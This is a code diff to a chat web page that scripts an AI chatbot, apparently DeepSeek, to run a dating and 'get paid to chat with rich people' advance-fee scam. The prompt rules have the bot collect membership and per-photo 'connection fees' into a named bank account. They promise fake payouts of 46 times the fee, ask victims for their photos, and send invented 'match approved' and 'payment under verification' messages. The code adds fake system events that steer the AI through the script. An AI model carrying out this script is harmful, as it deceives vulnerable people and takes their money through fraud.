@@ -257,7 +257,7 @@
 
         <div class="input-box-wrapper">
             <input type="text" id="messageInput" placeholder="Type a message" oninput="toggleInputButton()" />
-            <button class="whatsapp-icon-btn" onclick="document.getElementById('fileInput',)" title="Camera">
+            <button class="whatsapp-icon-btn" onclick="document.getElementById('fileInput').click()" title="Camera">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
             </button>
         </div>
@@ -329,8 +329,9 @@
     - Base message: "alright before you can be able to connect with anyone, You have to register and become a member of our platform Now To activate your Membership, Now To activate your Member ID you have to make the payment of [Total Fee] This fee helps cover operational costs, Facebook ads and improve match quality, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
 
     Question 5 TRIGGER: User submits or confirms the selected profile picture(s) from the match gallery.
-    - Rule for Sugar Mommy & Chat With Rich People: Only ONE picture is allowed. If more than one is selected, remind them that only one selection is permitted for this category.
-    - Rule for Serious Relationships / Hookups / FWB: Multiple pictures are allowed. Count how many pictures were selected. Multiply the standard connection fee by the number of selected pictures (e.g. if standard fee is ₦4,000 and they selected 2 pictures, the total fee is ₦8,000). You can allow slight negotiation after payment (e.g. reducing ₦8,000 to ₦6,000 or ₦7,000, or ₦4,000 to ₦3,000 for 1 picture).
+    - Strict Multi-Picture Selection Rule: 
+      - For Sugar Mommy / Sugar Daddy and Get Paid for Chatting with Rich People Abroad, the user is strictly restricted to selecting ONE picture only. If they selected more than one, politely remind them that only 1 picture is allowed for this category and ask them to choose just 1.
+      - For Serious Relationships, Hookups, FWB, and other categories, the user can select multiple pictures. If they select more than 1 picture (e.g. 2 pictures), calculate the connection fee proportionally (e.g. if standard fee for 1 picture is ₦4,000, 2 pictures equals ₦8,000). You can negotiate or reduce the fee after payment confirmation (e.g., down to ₦6,000 or ₦7,000 for multiple picks, or ₦3,000 if they picked only 1).
     - Base message: "Your payment is still under verification, please send a clear picture of yourself so we can submit it to your match." (Rephrase uniquely)
 
     Question 6 TRIGGER: User sends their picture.
@@ -338,10 +339,14 @@
     - Important Rule: When the user replies with ok, alright, or confirms they understand, you must reply: "Your match has not yet responded. When they approve your request, I will let you know immediately."
 
     Question 7 TRIGGER: Begin this question after informing them that their match has not yet responded and transitioning to the fee agreement step:
-    - [For Sugar Mommy / Sugar Daddy]: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. So how much can you afford to pay for expenses?" (Background rule: accept custom amounts between ₦4,500 and ₦20,000, and calculate expected payout using a 46x multiplier).
-    - [For Get paid for chatting with rich people abroad]: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is $20, you would be paid $920 per service. So how much can you afford to pay for expenses?" (Background rule: accept custom amounts between $10 and $40, and calculate expected payout using a 46x multiplier).
+    - [For Sugar Mommy / Sugar Daddy]: 
+      - Base message: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. So how much can you afford to pay for expenses?"
+      - AI Calculation Strategy: Accept custom amounts between ₦4,500 and ₦20,000. Multiply the user's input by 46 to calculate their expected payout, state their expected payout to them, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
+    - [For Get paid for chatting with rich people abroad]: 
+      - Base message: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is $20, you would be paid $920 per service. So how much can you afford to pay for expenses?"
+      - AI Calculation Strategy: Accept custom amounts between $10 and $40. Multiply the user's input by 46 to calculate their expected payout in dollars, state their expected payout to them, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
     - [For Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group]: "Your match has approved their interest! To finalize, a connection fee of ₦3,000 is required to cover profile verification. Do you agree? (YES/NO)"
-    - [For Serious relationship in Nigeria & Serious relationship outside Nigeria]: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. (Note: If multiple profiles were selected, multiply the standard fee accordingly, e.g., ₦4,000 per profile). Do you agree? (YES/NO)"
+    - [For Serious relationship in Nigeria & Serious relationship outside Nigeria]: "Your match has approved their interest! To finalize, a connection fee of ₦4,000 is required to cover profile verification (or ₦8,000 if 2 profiles were selected). Do you agree? (YES/NO)"
 
     Question 8 TRIGGER: User completed match gallery selection form and agreed to connection fee.
     - Base message: "alright, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
@@ -386,7 +391,7 @@
     let pendingCategoryPage = localStorage.getItem('pending_category_page') || '';
     let pendingCategoryName = localStorage.getItem('pending_category_name') || '';
     let usedReceiptNumbers = JSON.parse(localStorage.getItem('used_receipt_numbers')) || [];
-    let isSending = false; // Prevents multiple fast-clicks
+    let isSending = false;
 
     window.addEventListener('DOMContentLoaded', () => {
         loadChatHistory();
@@ -432,7 +437,7 @@
         const btn = document.getElementById('persistentLinkBtn');
         const inputAreaBox = document.getElementById('inputAreaBox');
 
-        // Only disable chat input box if membership fee is paid AND they haven't completed gallery return yet
+        // Once membership is paid OR if user is returning from gallery submission, keep chat open and hide the yellow button
         if (isPaid && savedUrl && !window.location.search.includes('returned=gallery')) {
             btn.href = savedUrl;
             btn.innerText = `Click Here to Open ${savedName || 'Match'} Gallery`;
@@ -447,6 +452,10 @@
     function checkReturnHandshake() {
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('returned') === 'gallery') {
+            // Hide the yellow gallery button immediately when returning to chat
+            document.getElementById('persistentButtonArea').style.display = 'none';
+            document.getElementById('inputAreaBox').classList.remove('disabled');
+
             const savedImages = JSON.parse(localStorage.getItem('pending_match_images') || '[]');
             
             if (savedImages.length > 0) {
@@ -461,16 +470,11 @@
                 localStorage.removeItem('pending_match_images');
             }
 
-            // Backend system event prompt for AI continuation
-            const backendPrompt = `[System Backend Event]: Candidate submitted selected profile photo(s) (${savedImages.length} photo(s) selected) from the match gallery. Send Question 8 trigger now providing Moniepoint account (6765911129, Akono Mercy Uka) and requesting connection fee payment with proper multiplication for multiple selections.`;
+            // Backend system event prompt for AI continuation from Question 5
+            const backendPrompt = `[System Backend Event]: Candidate submitted selected profile photo(s) from the match gallery (${savedImages.length} photo(s) selected). If Sugar Mommy or Get Paid category, enforce 1-photo limit. Otherwise for multiple photos, scale fee accordingly. Continue chat from Question 5 now.`;
             chatHistory.push({ role: "system", content: backendPrompt });
             saveChatHistory();
             window.history.replaceState({}, document.title, window.location.pathname);
-            
-            // Re-enable chat box immediately on return
-            document.getElementById('inputAreaBox').classList.remove('disabled');
-            document.getElementById('persistentButtonArea').style.display = 'none';
-
             triggerDeepSeekResponse();
         }
     }
@@ -836,7 +840,7 @@
                     <li>Scroll down and tap <b>"Add to Home Screen"</b> ➕.</li>
                     <li>Tap <b>"Add"</b> in the top-right corner.</li>
                 </ol>
-                <p class="note">iPhone doesn't allow websites to install Governments or apps directly, so this takes these 3 quick taps.</p>`);
+                <p class="note">iPhone doesn't allow websites to install apps directly, so this takes these 3 quick taps.</p>`);
             return;
         }
 
